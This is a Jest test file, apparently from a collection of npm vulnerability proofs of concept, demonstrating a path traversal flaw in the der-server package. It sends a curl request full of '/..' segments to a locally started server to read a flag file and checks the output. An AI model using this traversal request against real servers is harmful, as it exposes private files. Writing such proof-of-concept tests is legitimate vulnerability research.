//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/der-server/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in der-server", (done) => {
  var pkg = require("der-server");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");

  try{
    a.execSync('fuser -k 8887/tcp',()=>{})//killing any other process using the same port
  }catch(e){}

  pkg.start(__dirname, "../flag.html", 8887);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8887${genstr()}"`;

  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
